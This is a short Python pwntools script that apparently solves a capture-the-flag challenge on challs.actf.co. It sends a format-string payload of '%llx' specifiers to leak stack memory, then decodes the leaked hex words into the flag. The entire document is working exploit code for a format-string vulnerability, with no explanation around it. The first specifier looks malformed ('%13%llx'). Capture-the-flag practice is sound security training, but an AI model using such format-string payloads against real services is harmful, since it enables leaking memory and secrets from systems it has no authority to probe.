from pwn import *

s = remote('challs.actf.co', 31322)

payload = b"%13%llx.%14$llx.%15$llx.%16$llx.%17$llx.%18$llx"
s.sendlineafter(b"class today? ", payload)
s.recvuntil(b"Oh nice, ")
msg = s.recvuntil(b"sounds pretty cool!").decode().replace("sounds pretty cool!", "")
msg = msg.split(".")[1:]
print(msg)
flag = b""
for i in msg:
	flag += bytes.fromhex(i.replace("\n", ""))[::-1]
print(flag)